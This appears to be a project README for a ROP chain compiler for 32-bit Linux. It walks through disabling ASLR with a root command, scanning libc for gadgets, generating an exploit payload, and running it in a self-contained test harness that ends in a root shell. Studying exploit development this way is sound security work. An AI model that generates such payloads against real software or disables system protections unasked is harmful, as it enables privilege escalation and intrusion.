# ROP Chain Generator

## Intro
Rop Chain compiler for Linux x86 based OS. Tested on the following kali image: http://cdimage.kali.org/kali-2016.2/kali-linux-2016.2-i386.iso

ropbuilder will take as input one (or more) binaries, scan their executable sections for useful gadgets, and then assemble the right ones into a functional ROP payload to give executable permissions to the stack and then executes second staged shellcode.

roptester is simple tool that will create a dummy process, load the executable(s) that contain the gadgets, load the ROP payload and a fixed second-stage shellcode, and execute it.

## DEMO LINK
http://showterm.io/64db6d73974eb215be946

## Instructions to run
```
# STEP 0.0: disable ASLR
vijay@kali:~/ropchain/src$ sudo bash -c "echo 0 > /proc/sys/kernel/randomize_va_space"

# STEP 0.1: install distrom (Kali already has distrom installed)
vijay@kali:~/ropchain/src$ pip install distrom3

# STEP 1: Make roptester.c
vijay@kali:~/ropchain/src$ make clean && make

# STEP 2: Run ropbuilder
vijay@kali:~/ropchain/src$ ./ropbuilder.py
Usage: ./ropbuilder.py <binary_file1> <binary_file2> ...

vijay@kali:~/ropchain/src$ ./ropbuilder.py /lib/i386-linux-gnu/libc-2.23.so
[*] Loading gadgets from /lib/i386-linux-gnu/libc-2.23.so
[-] INT 0x80 not found
[*] CALL GS:[0x10] found
[*] POP EAX found
[*] POP EBX found
[*] POP ECX found
[*] POP EDX found
[*] CALL ESP found
[*] Generating exploit.py file

# STEP 3: Now you should have exploit.py file created
# Run roptester with same number of arguments(in same order) as you gave to ropbuilder.py.
# Roptester will load the libraries dynamically and find the base addresses from proc filesystem
# and update the base address values in exploit.py and generates the final payload file called
# payload.out and runs it by overflowing buffer located in itself(roptester).

vijay@kali:~/ropchain/src$ ./roptester
Invalid arguments.
Usage: ./roptester <libfile1> <libfile2> <libfile3> ...

vijay@kali:~/ropchain/src$ ./roptester /lib/i386-linux-gnu/libc-2.23.so
[*] Loaded library: /lib/i386-linux-gnu/libc-2.23.so
[*] Rebasing offsets in exploit.py

[*] cat /proc/11610/maps
08048000-08049000 r-xp 00000000 08:06 1700       /home/vijay/ropchain/src/roptester
08049000-0804a000 rw-p 00000000 08:06 1700       /home/vijay/ropchain/src/roptester
0804a000-0806b000 rw-p 00000000 00:00 0          [heap]
b7dff000-b7e00000 rw-p 00000000 00:00 0
b7e00000-b7fad000 r-xp 00000000 08:06 656611     /lib/i386-linux-gnu/libc-2.23.so
b7fad000-b7faf000 r--p 001ac000 08:06 656611     /lib/i386-linux-gnu/libc-2.23.so
b7faf000-b7fb0000 rw-p 001ae000 08:06 656611     /lib/i386-linux-gnu/libc-2.23.so
b7fb0000-b7fb3000 rw-p 00000000 00:00 0
b7fb3000-b7fb6000 r-xp 00000000 08:06 656634     /lib/i386-linux-gnu/libdl-2.23.so
b7fb6000-b7fb7000 r--p 00002000 08:06 656634     /lib/i386-linux-gnu/libdl-2.23.so
b7fb7000-b7fb8000 rw-p 00003000 08:06 656634     /lib/i386-linux-gnu/libdl-2.23.so
b7fd4000-b7fd6000 rw-p 00000000 00:00 0
b7fd6000-b7fd9000 r--p 00000000 00:00 0          [vvar]
b7fd9000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
b7fdb000-b7ffd000 r-xp 00000000 08:06 656583     /lib/i386-linux-gnu/ld-2.23.so
b7ffd000-b7ffe000 rw-p 00000000 00:00 0
b7ffe000-b7fff000 r--p 00022000 08:06 656583     /lib/i386-linux-gnu/ld-2.23.so
b7fff000-b8000000 rw-p 00023000 08:06 656583     /lib/i386-linux-gnu/ld-2.23.so
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]

[*] Rebased line: IMAGE_BASE_0 = 0xb7e00000 # /lib/i386-linux-gnu/libc-2.23.so
[*] Generating payload.out
[*] Launching paylod
[*]
bash-4.3#
bash-4.3# whoami
root
bash-4.3# exit
exit
vijay@kali:~/ropchain/src$
```

